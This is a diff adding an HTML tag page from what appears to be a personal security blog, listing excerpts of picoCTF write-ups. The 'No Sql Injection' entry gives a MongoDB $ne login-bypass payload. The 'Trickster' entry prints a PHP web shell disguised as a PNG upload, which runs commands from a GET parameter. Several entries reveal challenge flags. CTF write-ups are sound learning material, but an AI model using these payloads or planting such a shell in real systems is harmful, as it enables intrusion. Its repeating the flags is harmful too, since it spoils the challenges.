@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Picoctf | NullByte Notes</title>
+<meta name="keywords" content="">
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/tags/picoctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/picoctf/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/tags/picoctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="NullByte Notes (Alt + H)">NullByte Notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tools/" title="Tools">
+                    <span>Tools</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/certifications/" title="Certifications">
+                    <span>Certifications</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/news/" title="News">
+                    <span>News</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header">
+  <h1>
+    Picoctf
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># No Sql Injection
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> wget https://artifacts.picoctf.net/c_atlas/37/app.tar.gz tar -xvzf app.tar.gz open the burpsuit and login with any credentioal and interupt the network and send to repeater and edit this by : &#34;email&#34;:&#34;{\&#34;$ne\&#34;: \&#34;null\&#34;}&#34;, &#34;password&#34;:&#34;{\&#34;$ne\&#34;: \&#34;null\&#34;}&#34; {“success”:true,“email”:“picoplayer355@picoctf.org”,“token”:“cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==”,“firstName”:“pico”,“lastName”:“player”}
+“token”:“cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==”
+picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_67b1a3c8}
+nonsql injection trick User:{&#34;$ne&#34;:“null”} Password: {&#34;$ne&#34;:“null”} </p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # No Sql Injection" href="http://localhost:1313/writeups/picoctf/pico-2024/no-sql-injection/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># Scan Surprise
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> I’ve gotten bored of handing out flags as text. Wouldn’t it be cool if they were an image instead? solution 1. ssh -p 64695 ctf-player@atlas.picoctf.net2. ls you find the QR code in this 3. zbarimg flag.png
+zbar-tools is a Linux package that lets you scan and read barcodes or QR codes directly from the command line. It includes tools like: ✅ zbarimg → scans QR codes/barcodes from images (PNG, JPG, etc.) ✅ zbarcam → scans QR codes/barcodes live from a webcam</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # Scan Surprise" href="http://localhost:1313/writeups/picoctf/pico-2024/scan-surprise/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># Secret of the Polyglot
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> The Network Operations Center (NOC) of your local institution picked up a suspicious file, they’re getting conflicting information on what type of file it is. They’ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Solution 1. wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf2. ls3. convert flag2of2-final.pdf flag2of2-final.png4. open flag2of2-final.png picoCTF{f1u3n7_
+5. apt install poppler-utils6. pdftotext flag2of2-final.pdf7. cat flag2of2-final.txt 1n_pn9_&amp;_pdf_7f9bccd1}
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # Secret of the Polyglot" href="http://localhost:1313/writeups/picoctf/pico-2024/secret-of-the-polyglot/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># SSTI1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Description: I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!
+Hints: Server Side Template Injection Solution Browse to the web site and you will see a web page that includes the text
+Verify SSTI The hint has already given away that the site uses server-side templates but we need to verify that and find out the backend technology used.
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # SSTI1" href="http://localhost:1313/writeups/picoctf/pico-2025/ssti1/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># Super SSH.md
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Description Using a Secure Shell (SSH) is going to be pretty important. Can you ssh as ctf-player to titan.picoctf.net at port 52017 to get the flag? You’ll also need the password 6dd28e9b. If asked, accept the fingerprint with yes.
+solution ssh -p 52017 ctf-player@titan.picoctf.net ssh → Secure Shell, used to remotely log into another computer/server. -p 52017 → Specifies a non-default port (52017 instead of the usual 22). ctf-player@titan.picoctf.net → Says: username: ctf-player server: titan.picoctf.net after enter psd
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # Super SSH.md" href="http://localhost:1313/writeups/picoctf/pico-2024/super-ssh/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># time machine
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Description What was I last working on? I remember writing a note to help me remember… You can download the challenge files here: challenge.zip
+solution wget https://artifacts.picoctf.net/c_titan/68/challenge.zipunzip challenge.zipcd drop-in/cat message.txt finally
+┌──(root㉿Harsh)-[/home/jhagan/h/drop-in]└─# git logcommit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -&gt; master)Author: picoCTF &lt;ops@picoctf.com&gt;Date: Sat Mar 9 21:10:36 2024 &#43;0000picoCTF{t1m3m@ch1n3_b476ca06} conclusion 1. Git keeps history — even if the file is changed or deleted Git records every commit (change) with: A unique commit hash An author and timestamp A commit message Even if the file with the sensitive information is later removed or modified, the data can still be recovered by checking older commits.
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # time machine" href="http://localhost:1313/writeups/picoctf/pico-2024/time-machine/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># Trickster
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Description I found a web app that can help process images: PNG
+solution create a file with name (untitle.png.php) edit this file PNG &lt;html&gt; &lt;body&gt; &lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt; &lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt; &lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt; &lt;/form&gt; &lt;pre&gt; &lt;?php if(isset($_GET[&#39;cmd&#39;])) { system($_GET[&#39;cmd&#39;] . &#39; 2&gt;&amp;1&#39;); } ?&gt; &lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; upload this png file and type http://atlas.picoctf.net:58157/uploads/untitled.png.php RUN ls -al ls -al /var/www/html cat /var/www/html/GAZWIMLEGU2DQ.txt </p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # Trickster" href="http://localhost:1313/writeups/picoctf/pico-2024/trickster/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># unminify
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> I don’t like scrolling down to read the code of my website, so I’ve squished it. As a bonus, my pages load faster!
+solution curl http://titan.picoctf.net:50120/
+seeing the clear CTF in output
+flag : class=“picoCTF{pr3tty_c0d3_dbe259ce}”
+</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # unminify" href="http://localhost:1313/writeups/picoctf/pico-2024/unminify/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent"># webdecode
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> WebDecode Do you know how to use the web inspector? Start searching here to find the flag Solution inspect the about page and there is a source code right above that header is a section with this attribute notify_true=“cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9”. from64 decord this and find the flag . USE : https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,&#39;&#39;)
+Flag: picoCTF{web_succ3ssfully_d3c0ded_02c…}
+</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to # webdecode" href="http://localhost:1313/writeups/picoctf/pico-2024/webdecode/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Blame Game.md
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Description: Someone’s commits seems to be preventing the program from working. Who is it?
+You can download the challenge files here: challenge.zip
+Hints:
+In collaborative projects, many users can make many changes. How can you see the changes within one file? Read the chapter on Git from the picoPrimer here You can use python3 .py to try running the code, though you won’t need to for this challenge. Challenge link: https://play.picoctf.org/practice/challenge/405 Solution Analyse the git repo We start by unpacking the zip-file
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Blame Game.md" href="http://localhost:1313/writeups/picoctf/pico-2024/blame-game/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="http://localhost:1313/tags/picoctf/">
+      «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="http://localhost:1313/tags/picoctf/page/3/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">NullByte Notes</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
